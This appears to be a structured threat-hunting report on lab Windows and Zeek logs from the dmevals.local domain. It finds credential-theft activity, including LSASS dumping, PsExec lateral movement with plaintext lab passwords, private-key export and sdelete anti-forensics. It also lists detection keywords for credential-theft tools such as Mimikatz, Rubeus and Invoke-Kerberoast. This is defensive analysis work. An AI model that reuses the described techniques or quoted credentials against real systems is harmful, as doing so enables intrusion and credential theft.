Across the 2020-05-02 window no evidence of Kerberos ticket theft or forgery was found. The only Kerberos protocol records are in the non-overlapping zeek window (2020-04-30 00:06-00:45Z): 35 kerberos events, all between 10.0.1.4/10.0.1.6 and the KDC 10.0.0.4, all for principal pbeesly/DMEVALS.LOCAL, all using aes256-cts-hmac-sha1-96, with normal AS (KDC_ERR_PREAUTH_REQUIRED then success) and TGS requests for cifs/NEWYORK, cifs/NASHUA, host/nashua.dmevals.local, ldap/NEWYORK.dmevals.local and HTTP/NASHUA. No RC4 (etype 23) ticket requests, no anomalous service-account TGS bursts, no krbtgt ticket anomalies. The rare LSASS handle accesses (0x1fffff, 0x1f3fff, 0x101001, 0x1000000, 0x3000) are all made by SYSTEM-context Windows components (wininit.exe, csrss.exe, svchost.exe/lsm.dll, WindowsAzureTelemetryService.exe/CorperfmonExt.dll) and by PowerShell/wsmprovhost running as pbeesly for process enumeration, not for credential dumping. The 4672 privileged-logon events are all NEWYORK$ machine-account logons with the standard machine privilege set.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:24:19.119Z | simplerockbuild.simplerock.lan | zeek | zeek.cipher | aes256-cts-hmac-sha1-96 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrotQ | q-ece611fdff | ok |
| 2 | 2020-04-30 00:24:19.110Z | simplerockbuild.simplerock.lan | zeek | zeek.error_msg | KDC_ERR_PREAUTH_REQUIRED | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrotP | q-ece611fdff | ok |
| 3 | 2020-05-02 03:18:34.438Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkady05 | q-5035fefa53 | ok |
| 4 | 2020-05-02 03:19:09.803Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\csrss.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAu | q-5035fefa53 | ok |
| 5 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.SubjectUserName | NEWYORK$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBM6 | q-9ce8c07f9d | ok |

### F47 · benign / medium · T1558.001 · No golden-ticket indicators (no krbtgt abuse, no forged-TGT privilege anomalies)

Evidence status: **verified**

No golden-ticket activity was observed. The only krbtgt-related Kerberos records are legitimate AS exchanges for pbeesly/DMEVALS.LOCAL in the zeek window (2020-04-30), and the single TGS for krbtgt/DMEVALS.LOCAL at 00:24:19Z is a normal ticket-renewal style request from the same client. No PowerShell script block contained krbtgt, golden, Mimikatz or kerberos::golden (check C252 returned zero hits). The 4672 privileged-logon events in windows.security are all NEWYORK$ machine-account logons with the standard machine privilege list, not forged-ticket privilege assignment. The full-access LSASS handles (0x1fffff) on scranton come from wininit.exe and csrss.exe at 03:19:09Z, i.e. normal system process management, not KRBTGT hash extraction.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:24:19.124Z | simplerockbuild.simplerock.lan | zeek | zeek.service | krbtgt/DMEVALS.LOCAL | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrovz | q-ece611fdff | ok |
| 2 | 2020-05-02 03:19:09.803Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wininit.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAt | q-5035fefa53 | ok |
| 3 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.security | win.PrivilegeList | SeSecurityPrivilege  			SeBackupPrivilege  			SeRestorePrivilege  			SeTakeOwnershipPrivilege  			SeDebugPrivilege  			SeSystemEnvironmentPrivilege  			SeLoadDr… | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxXRNx | q-9ce8c07f9d | ok |

### F48 · benign / medium · T1558.002 · No silver-ticket indicators; service-ticket requests are ordinary AES256 TGS for pbeesly

Evidence status: **verified**

No silver-ticket activity was observed. All TGS requests in the zeek window are AES256 (aes256-cts-hmac-sha1-96) requests by pbeesly/DMEVALS.LOCAL for cifs/NEWYORK, cifs/NASHUA, host/nashua.dmevals.local, ldap/NEWYORK.dmevals.local and HTTP/NASHUA, each preceded by a successful AS exchange with the KDC 10.0.0.4 - consistent with normal SMB/LDAP/HTTP authentication, not forged service tickets. No PowerShell script block referenced silver, Mimikatz or service ticket (check C258 zero hits). The LSASS accesses with service-account-relevant masks (0x1400 by WindowsAzureTelemetryService.exe via CorperfmonExt.dll, 0x101001 by svchost.exe via lsm.dll) are .NET performance-counter and LSA policy reads, not service-account hash theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:24:19.122Z | simplerockbuild.simplerock.lan | zeek | zeek.service | cifs/NEWYORK | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrovy | q-ece611fdff | ok |
| 2 | 2020-04-30 00:36:38.972Z | bobs.bigwheel.local | zeek | zeek.service | host/nashua.dmevals.local | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItz8vIp5 | q-ece611fdff | ok |
| 3 | 2020-05-02 03:19:42.009Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkbfEQ2 | q-5035fefa53 | ok |

### F49 · benign / medium · T1558.003 · No Kerberoasting: no RC4 TGS bursts or SPN enumeration tooling

Evidence status: **verified**

No Kerberoasting was observed. The zeek Kerberos log shows only 11 TGS requests in the whole 2020-04-30 window, all AES256 and all for the single principal pbeesly/DMEVALS.LOCAL, with no RC4 (etype 23) requests and no burst of service-ticket requests against service accounts. No PowerShell script block contained kerberoast, Invoke-Kerberoast, GetUserSPNs or SPN (check C264 zero hits). The 4624 logon stacking shows only machine accounts (NEWYORK$, SCRANTON$, NASHUA$, WEC$, UTICA$), SYSTEM, pbeesly and default DWM/UMFD accounts - no anomalous authentication with harvested Kerberos material.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.service | HTTP/NASHUA | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrov7 | q-ece611fdff | ok |
| 2 | 2020-04-30 00:33:14.816Z | simplerockbuild.simplerock.lan | zeek | zeek.service | ldap/NEWYORK.dmevals.local | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrotT | q-ece611fdff | ok |
| 3 | 2020-04-30 00:24:19.119Z | simplerockbuild.simplerock.lan | zeek | zeek.cipher | aes256-cts-hmac-sha1-96 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrotQ | q-ece611fdff | ok |

### F50 · benign / medium · T1558.004 · No AS-REP Roasting: all AS exchanges required pre-authentication

Evidence status: **verified**

No AS-REP Roasting was observed. Every AS request in the zeek window (14 AS records from 10.0.1.4 and 10.0.1.6 to the KDC 10.0.0.4) first returned KDC_ERR_PREAUTH_REQUIRED and was then completed successfully with AES256 - i.e. pre-authentication was enforced for pbeesly, so no account was roastable. No process creation with asreproast, GetNPUsers or Rubeus command lines (check C267 zero hits) and no PowerShell script block containing asreproast, GetNPUsers, Rubeus or preauth (check C269 zero hits).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:36:38.961Z | bobs.bigwheel.local | zeek | zeek.error_msg | KDC_ERR_PREAUTH_REQUIRED | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItz8vIp3 | q-ece611fdff | ok |
| 2 | 2020-04-30 00:36:38.970Z | bobs.bigwheel.local | zeek | zeek.success | True | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItz8vIp4 | q-ece611fdff | ok |

### F53 · benign / high · T1606 · No forged web credentials observed; hits explained by PsExec lateral movement and system process-access noise

Evidence status: **verified**

The T1606 check hits do not show forged web credentials. The 4648 explicit-credential logons (15 total) are dominated by pbeesly authenticating to NASHUA via PsExec (win.ProcessName C:\Windows\PSEXESVC.exe, TargetServerName localhost, SubjectUserName NASHUA$) plus routine DWM-/UMFD-/machine-account logons from winlogon.exe/wininit.exe/taskhostw.exe. The rare Sysmon 10 access masks (0x101541, 0x101441, 0x103800/0x103801, 0x1014c0) are all system-to-system accesses: svchost.exe->wmiprvse.exe (WMI), services.exe->sppsvc.exe, csrss.exe->sppsvc.exe, svchost.exe->svchost.exe (appinfo/RPC), with call traces in wmiprvsd.dll, basesrv.dll, appinfo.dll and RPCRT4.dll. The 0x1fffff full-access grants are likewise csrss.exe/svchost.exe/services.exe/conhost.exe/PSEXESVC.exe opening normal child processes. No forged credential material was found. Note: the surrounding activity IS malicious (see T1606.001 finding) but it is credential theft/lateral movement, not web-credential forging.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjE0ff | q-1412e224db | ok |
| 2 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.TargetServerName | localhost | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjE0ff | q-1412e224db | ok |
| 3 | 2020-05-02 03:01:28.962Z | newyork.dmevals.local | windows.sysmon | win.GrantedAccess | 0x101541 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpLbBWk | q-33376ef767 | ok |
| 4 | 2020-05-02 03:01:28.962Z | newyork.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpLbBWk | q-33376ef767 | ok |
| 5 | 2020-05-02 03:03:18.136Z | newyork.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\sppsvc.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpFTsz_ | q-33376ef767 | ok |

### F55 · benign / high · T1606.002 · No SAML token forging; logon packages are standard Kerberos/Negotiate

Evidence status: **verified**

All 297 successful 4624 logons use standard authentication packages (Kerberos 217, Negotiate 78, NTLM 1, '-' 1) and standard logon processes (Kerberos 217, Advapi 76, User32 2, NtLmSsp 1, '-' 1); there is no SAML/ADFS/token-signing component, no unusual authentication package, and no token or federation artifact in the file-creation data. The 4648 explicit-credential events are the same PsExec/DWM/UMFD/machine-account set described above. Nothing in the retrieved events indicates forged SAML tokens.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjFEcw | q-1412e224db | ok |
| 2 | 2020-05-02 03:19:10.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\winlogon.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsc9wOe | q-1412e224db | ok |
| 3 | 2020-05-02 03:19:35.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItsQ2v-T | q-1412e224db | ok |

### F57 · benign / high · T1649 · Sysmon self-signed certificate written to ROOT store on nashua.dmevals.local (benign)

Evidence status: **verified**

The only SystemCertificates registry modification in the window is on nashua.dmevals.local at 2020-05-02T03:16:19Z: Security 4657 shows the value 'Blob' of \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 modified by process C:\Windows\Sysmon.exe running as NASHUA$ (S-1-5-18, logon 0x3E7), with matching 4663 read/write access on the same key by Sysmon.exe. Sysmon creates and installs its own self-signed certificate for config/archive signing, and the corresponding certificate file C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\A4F69156AB2E4C5AFBB55BFD66DC60F0D398FE9A was created by C:\windows\Sysmon.exe at the same timestamp. No attacker tooling, no key export and no non-Sysmon process touched the certificate stores on this host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhDM5P | q-3a8b5548af | ok |
| 2 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\Sysmon.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhDM5P | q-3a8b5548af | ok |
| 3 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.SubjectUserName | NASHUA$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhDM5P | q-3a8b5548af | ok |
| 4 | 2020-05-02 03:16:19.462Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\A4F69156AB2E4C5AFBB55BFD66DC60F0D398FE9A | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkmtAyJ | q-b27944307d | ok |
| 5 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwhDM45 | q-3f21cbea60 | ok |

### F58 · benign / medium · T1649 · Kerberos TGT requests show no certificate-based (PKINIT) authentication

Evidence status: **verified**

All 14 Kerberos 4768 TGT requests in the window were logged on newyork.dmevals.local for pbeesly (9) and the machine account SCRANTON$ (5), all with PreAuthType 2 (encrypted timestamp, i.e. password-based pre-authentication, not PKINIT/certificate pre-auth), TicketEncryptionType 0x12 (AES-256) and Status 0x0. No certificate-based logon or forged-ticket indicator is present in the Kerberos data; the TGT volume is consistent with normal workstation logon/renewal behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.PreAuthType | 2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjFEcb | q-705df51b6e | ok |
| 2 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjFEcb | q-705df51b6e | ok |
| 3 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItse-35u | q-705df51b6e | ok |
| 4 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | win.TicketEncryptionType | 0x12 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItse-35u | q-705df51b6e | ok |

## Pivot candidates

Processes the pivot reviewer had to assess (started by a script host or from outside the Windows directory, rare in the 15-minute windows around verified activity).

| Host | Executable | Starts | Parents | Assessment | Reason |
|---|---|---|---|---|---|
| nashua.dmevals.local | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | 1 | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | benign | Signed Store app self-restarting; its WerFault crash reports are unrelated to credential access. |
| nashua.dmevals.local | C:\Windows\Temp\python.exe | 5 | C:\Windows\PSEXESVC.exe, C:\Windows\Temp\python.exe | malicious | Dropped into C:\Windows\Temp and launched 4x by PSEXESVC.exe as pbeesly (03:11:40–03:15:03) after PsExec64 with plaintext password; it spawned powershell.exe, R… |
| nashua.dmevals.local | C:\Windows\Temp\Rar.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Started by pbeesly's PowerShell on nashua to create password-protected C:\Users\pbeesly\Desktop\working.zip from AppData\Roaming\working.zip (-hpfGzq5yKw), then… |
| nashua.dmevals.local | C:\Windows\Temp\sdelete64.exe | 3 | C:\Windows\System32\cmd.exe | malicious | Anti-forensics: run by cmd.exe (child of python.exe) to wipe Rar.exe and both working.zip copies on nashua. |
| nashua.dmevals.local | C:\WindowsAzure\Packages\CollectGuestLogs.exe | 1 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Azure guest agent diagnostic collection started by WaAppAgent.exe; standard platform activity. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.… | 4 | C:\Windows\System32\cmd.exe, C:\Windows\System32\services.exe | benign | Azure Network Watcher agent service/plugin, started by services.exe and its own cmd.exe helpers. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\Antimalware… | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure IaaS antimalware configuration plugin launched by WindowsAzureGuestAgent.exe. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\bin\CustomScr… | 1 | C:\Windows\System32\cmd.exe | benign | Azure VM custom-script extension handler; standard guest-agent child. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.JsonADDomainExtension\1.3.2\bin\JsonADDoma… | 1 | C:\Windows\System32\cmd.exe | benign | Azure AD domain-join extension handler; standard guest-agent child. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Google Update crash handler spawned by GoogleUpdate.exe. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Google Update crash handler spawned by GoogleUpdate.exe. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | 3 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe, C:\Windows\System32\servi… | benign | Google Update service/updater started by services.exe/svchost.exe. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\accessChk.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Run by pbeesly's PowerShell from the attacker-staged SysinternalsSuite and wrote C:\Program Files\SysinternalsSuite\passwordsDB — credential-file discovery/coll… |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\PsExec64.exe | 4 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Four launches by pbeesly's PowerShell to \\NASHUA with plaintext password Fl0nk3rt0n!T0by to run C:\Windows\Temp\python.exe. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\sdelete64.exe | 3 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Run by pbeesly's PowerShell to wipe the malicious .scr, Draft.Zip and SysinternalsSuite.zip — anti-forensics. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\MsMpEng.exe | 1 | C:\Windows\System32\services.exe | benign | Windows Defender service started by services.exe. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\NisSrv.exe | 2 | C:\Windows\System32\services.exe | benign | Windows Defender network inspection service started by services.exe. |
| scranton.dmevals.local | C:\ProgramData\victim\â€®cod.3aka3.scr | 1 | C:\Windows\explorer.exe | malicious | Suspicious .scr in C:\ProgramData\victim launched by explorer.exe with /S; wrote monkey.png to Downloads and spawned cmd.exe, later wiped with sdelete64. |
| scranton.dmevals.local | C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe | 2 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Invoked twice by pbeesly's PowerShell with @cmdline response files to compile qkbkqqbs.dll and 0piklvia.dll in Temp — in-memory tooling used right before LSASS … |
| scranton.dmevals.local | C:\Windows\System32\hostui.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | suspicious | Started by pbeesly's PowerShell with no arguments and immediately opened Explorer.EXE with 0x1400 (VM_READ) from its own code — consistent with UI/clipboard har… |
| scranton.dmevals.local | C:\Windows\System32\sdclt.exe | 3 | C:\Windows\System32\cmd.exe | suspicious | Three sdclt.exe launches by cmd.exe as pbeesly at 02:58:42–02:58:43 followed by control.exe — sdclt is a known UAC-bypass/backup-abuse binary; no credential art… |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\BfeToolWin8.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure guest agent firewall helper. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\FindVolume\FindVolume.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure guest agent volume discovery helper. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Azure Windows guest agent service. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe | 1 | C:\Windows\System32\services.exe | benign | Azure telemetry service started by services.exe. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\WaAppAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Azure agent host service started by services.exe. |
| scranton.dmevals.local | C:\WindowsAzure\SecAgent\WaSecAgentProv.exe | 2 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Azure security agent provider started by WaAppAgent.exe. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPl… | 1 | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | benign | Azure network agent plugin loaded by WindowsAzureNetAgent.exe. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | 1 | C:\Windows\System32\services.exe | benign | Azure network agent service started by services.exe. |

## Technique conclusions

One line per technique in scope: status from the triage of its family; `not_observed` = checked, nothing found; `not_observable` = no dataset records it.

| Technique | Status | Reason |
|---|---|---|
| T1003 OS Credential Dumping | malicious | SysinternalsSuite staged in Downloads, accessChk/PsExec/sdelete run from user paths, python.exe dropped in C:\Windows\Temp on nashua and later wiped. |
| T1003.001 LSASS Memory | malicious | PowerShell-compiled DLLs (csc.exe) followed by lsass.exe handles 0x1f3fff/0x1fffff with UNKNOWN call-trace frames on scranton; wsmprovhost 0x1f3fff on nashua. |
| T1003.002 Security Account Manager | not_observed | No SAM/SECURITY hive access, reg save, or hive copy events. |
| T1003.003 NTDS | not_observed | No ntds/ntdsutil/vssadmin activity in sysmon or 4688 command lines. |
| T1003.004 LSA Secrets | suspicious | pbeesly's processes (including C:\ProgramData\victim\â€®cod.3aka3.scr) read \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa; the 4662 Policy\Secrets\$MACHINE.ACC events were benign LOCAL SERVICE machine-account access… |
| T1003.005 Cached Domain Credentials | not_observed | No Cache/NL$ object access events. |
| T1003.006 DCSync | benign | Single 4662 with DS-Replication-Get-Changes was performed by the NEWYORK$ machine account on its own DC; no drsuapi/lsadump/DCSync tooling anywhere. |
| T1040 Network Sniffing | benign | The only capture-tooling command lines were two netsh.exe 'trace start capture=yes'/'trace stop' invocations on scranton.dmevals.local whose parent is the Azure Network Watcher agent (NetworkWatcherAgent.exe), followed b… |
| T1056 Input Capture | malicious | Input capture confirmed on scranton.dmevals.local: PowerShell Invoke-ScreenCapture loop plus Get-Clipboard by user pbeesly, followed by Remove-Job cleanup. |
| T1056.001 Keylogging | not_observed | No keylogger indicators in process creation, PowerShell script blocks, service installs or registry writes; capture was GUI/clipboard based. |
| T1056.002 GUI Input Capture | suspicious | hostui.exe launched by PowerShell and read Explorer.EXE memory (0x1400) one second later; no direct clipboard artifact captured. |
| T1056.003 Web Portal Capture | not_observed | No IIS/web-shell artifacts, no inetpub/aspx file or object access, and no credential-portal HTTP POSTs in Zeek. |
| T1056.004 Credential API Hooking | suspicious | powershell.exe (0x1000) and wsmprovhost.exe (0x1f3fff) opened handles to lsass.exe on scranton and nashua; no injected hooking DLLs observed. |
| T1110 Brute Force | not_observed | No 4625 or 4771 events at all in windows.security and no authentication-attempt tooling; the credential access in this window is LSASS dumping by hidden PowerShell on scranton, not brute force. |
| T1110.001 Password Guessing | not_observed | Zero failed logons (4625) across all hosts/users/logon types; all 297 4624 logons succeeded, mostly machine accounts. |
| T1110.002 Password Cracking | suspicious | No cracking tools, wordlists or potfiles were created or executed, but PowerShell.exe opened lsass.exe with 0x1fffff/0x1f3fff on scranton at 03:05:16 from a hidden monkey.png loader, consistent with dumping hashes for of… |
| T1110.003 Password Spraying | not_observed | No 4625/4771 failures; the 15 4648 explicit-credential logons are pbeesly PsExec runs to NASHUA plus DWM/UMFD/SCRANTON$ system artifacts, i.e. reuse of one known credential, not spraying. |
| T1110.004 Credential Stuffing | not_observed | No failed authentications and all 4624 source IPs are internal (10.0.x.x, 172.18.39.2, ::1, link-local); no stuffed credential lists observed. |
| T1111 Multi-Factor Authentication Interception | not_observed | No MFA/smartcard/NGC/PhoneFactor interception artifacts: a sysmon search for MultiFactor, MFA, Ngc, Wbio and PhoneFactor in win.TargetFilename, win.ImageLoaded and registry.path returned 0 hits. The LSASS handle hits are… |
| T1187 Forced Authentication | not_observed | No forced-authentication artifacts: all 66 SMB 139/445 connections came from process 'System' to internal addresses (10.0.0.4, 10.0.1.6, fe80::e40c:95b6:b0a7:6429); the only Startup .lnk (hostui.lnk) was written by Power… |
| T1212 Exploitation for Credential Access | not_observed | 326 lsass process-access events are dominated by 0x1000/0x1400 masks from svchost.exe, AntimalwareConfig.exe and WindowsAzureTelemetryService.exe; the high-access outliers come from Windows components (wininit/csrss/serv… |
| T1539 Steal Web Session Cookie | not_observed | No browser cookie/credential store was read, copied or exfiltrated on any host. C121/C122/C123/C124/C125 hits are false positives: Windows Search indexer (SearchProtocolHost.exe) launches, Edge's own _TempTestAccess.txt … |
| T1552 Unsecured Credentials | malicious | Plaintext credentials cozy/MyCozyPassw0rd! in Invoke-Exfil and dmevals\pbeesly/Fl0nk3rt0n!T0by on the PsExec64 command lines; sdclt.exe burst also noted as suspicious. |
| T1552.001 Credentials In Files | malicious | passwordsDB written by accesschk, Draft.Zip, OfficeSupplies.7z and working.zip archives created and then wiped. |
| T1552.002 Credentials in Registry | benign | All registry credential-path writes were routine IdentityCRL/Winlogon/CredentialEnrollmentManager/CredentialGuard values; no reg query/save of SAM or LSA secrets. |
| T1552.003 Shell History | not_observed | Zero hits for ConsoleHost_history, Get-History or history-file access across powershell, sysmon and security datasets. |
| T1552.004 Private Keys | malicious | Get-PrivateKeys exported LocalMachine certs with private keys to C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx using hardcoded password saribas. |
| T1552.006 Group Policy Preferences | malicious | Malicious .scr in C:\ProgramData\victim executed by explorer and subsequently wiped with sdelete64. |
| T1555 Credentials from Password Stores | malicious | PowerShell and wsmprovhost opened lsass.exe with 0x1f3fff/0x1fffff on scranton and nashua; all other lsass handles are svchost 0x1000. |
| T1555.003 Credentials from Web Browsers | not_observed | Zero hits for Login Data, Cookies, Web Data or Local State across Sysmon file/process events, Security 4663 and PowerShell script blocks; windows.other file/process events were only Hyper-V miniport and time-change messa… |
| T1555.004 Windows Credential Manager | not_observed | No vault/cmdkey/CredentialManager/Get-StoredCredential activity in Sysmon, Security or PowerShell; only a benign boot-time Credential Guard configuration message on scranton. |
| T1555.005 Password Managers | not_observed | No KeePass/1Password/LastPass/Bitwarden/.kdbx references in Sysmon process creation or access, Security 4688, PowerShell script blocks or windows.other. |
| T1556 Modify Authentication Process | suspicious | Attacker pbeesly performed credential access (full-access LSASS handles from PowerShell/wsmprovhost) and lateral movement, but no authentication-process modification was observed; family hits are credential-theft adjacen… |
| T1556.001 Domain Controller Authentication | suspicious | LSASS opened with 0x1fffff/0x1f3fff by attacker PowerShell (scranton) and wsmprovhost (nashua) — credential dumping rather than DC authentication backdoor; no injected auth on a DC. |
| T1556.002 Password Filter DLL | not_observed | Only lsass.exe boot-time LSA registry values (LsaPid, LsaCfgFlagsDefault, ProductType); no Notification Packages change, no filter DLL, only standard cryptdll.dll loaded. |
| T1556.005 Reversible Encryption | not_observed | No 4739 policy changes or reversible-encryption commands; the single 4104 hit is the benign MSFT_xADCommon.ps1 DSC module. |
| T1556.006 Multi-Factor Authentication | not_observed | No 4739/5136 events or authentication-policy commands; logon types are normal (3/5/2/10). |
